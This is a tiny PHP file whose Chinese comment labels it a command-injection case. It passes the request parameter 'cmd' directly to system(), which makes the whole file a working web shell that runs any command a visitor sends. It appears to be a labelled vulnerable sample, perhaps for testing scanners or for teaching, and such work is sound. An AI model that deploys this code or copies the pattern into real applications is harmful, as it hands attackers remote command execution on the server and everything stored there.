<?php
// 命令注入：$_REQUEST -> system
$cmd = $_REQUEST['cmd'];
system($cmd);
?>
